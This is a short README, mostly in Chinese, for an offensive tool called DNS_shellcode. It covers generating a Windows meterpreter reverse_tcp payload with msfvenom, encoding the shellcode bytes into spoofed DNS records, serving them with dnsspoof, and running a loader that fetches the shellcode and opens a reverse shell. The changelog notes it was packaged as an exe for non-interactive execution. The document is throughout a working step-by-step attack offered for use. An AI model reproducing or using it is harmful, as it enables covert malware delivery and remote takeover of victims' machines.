# DNS_shellcode
DNS_shellcode分离传输脚本
## step.1
- msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.32.133 lport=5555 -f c > /root/safe/payload.txt

## step.2
将shellcode制作成  IP+地址 的格式
Ipaddress "{payload}.domain.com"
- 1.1.1.0 "0xfc0x480x830xe40xf00xe8.1.com"
- 1.1.1.1 "0xbc0xc80x130xff0x100x08.1.com"

python格式化脚本可参见项目script_format.py

## step.3
#### DNS_Server
- dnsspoof -i eth0 -f dns.txt
listening msf

## setp.4
Execute this python_scripts and input Your Bad_DNS_Server_IP
- python DNS_shellcode.py -o 192.168.1.1

## 更新日志
2020/2/12

狗林说双方无交互下无法input，改命令格式+pyinstaller的exe格式。

更新命令格式
- python DNS_shellcode.py -o 192.168.1.1
